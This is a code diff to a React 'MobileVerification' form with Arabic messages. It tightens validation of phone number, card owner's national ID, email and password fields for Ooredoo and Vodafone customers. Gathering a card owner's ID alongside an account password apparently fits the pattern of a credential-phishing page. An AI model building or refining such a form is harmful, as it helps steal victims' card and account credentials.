@@ -74,15 +74,16 @@ export default function MobileVerification() {
     if (!provider) { errs.provider = "يرجى اختيار مزود الخدمة"; }
     if (provider === "ooredoo") {
       if (!phone.trim()) errs.phone = "هذا الحقل مطلوب";
-      else if (phone.length < 7) errs.phone = "رقم الهاتف غير صحيح";
+      else if (phone.length < 7 || phone.length > 12) errs.phone = "رقم الهاتف يجب أن يكون بين 7 و 12 رقم";
       if (!nationalId.trim()) errs.nationalId = "هذا الحقل مطلوب";
+      else if (!/^\d+$/.test(nationalId)) errs.nationalId = "الرقم الشخصي يجب أن يحتوي على أرقام فقط";
       if (!email.trim()) errs.email = "هذا الحقل مطلوب";
-      else if (!validateEmail(email)) errs.email = "البريد الإلكتروني غير صحيح";
+      else if (!validateEmail(email)) errs.email = "يرجى إدخال بريد إلكتروني صحيح (مثال: name@domain.com)";
       if (!password.trim()) errs.password = "هذا الحقل مطلوب";
-      else if (password.length < 4) errs.password = "كلمة المرور قصيرة جداً";
+      else if (password.length < 6) errs.password = "كلمة المرور يجب أن تكون 6 أحرف على الأقل";
     } else if (provider === "vodafone") {
       if (!vodaPhone.trim()) errs.vodaPhone = "هذا الحقل مطلوب";
-      else if (vodaPhone.length < 7) errs.vodaPhone = "رقم الهاتف غير صحيح";
+      else if (vodaPhone.length < 7 || vodaPhone.length > 12) errs.vodaPhone = "رقم الهاتف يجب أن يكون بين 7 و 12 رقم";
     }
     if (Object.keys(errs).length > 0) { setErrors(errs); return; }
     setErrors({});
@@ -204,7 +205,7 @@ export default function MobileVerification() {
                 <div style={fieldStyle}>
                   <label style={labelStyle}>الرقم الشخصي لمالك البطاقة <span style={{ color: "#cc0000" }}>*</span></label>
                   <input type="text" value={nationalId}
-                    onChange={(e) => { setNationalId(e.target.value); setErrors(p => ({...p, nationalId: ""})); }}
+                    onChange={(e) => { setNationalId(e.target.value.replace(/[^0-9]/g, "")); setErrors(p => ({...p, nationalId: ""})); }}
                     placeholder="Id" style={inputStyle(!!errors.nationalId)} />
                   {errors.nationalId && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.nationalId}</span>}
                 </div>
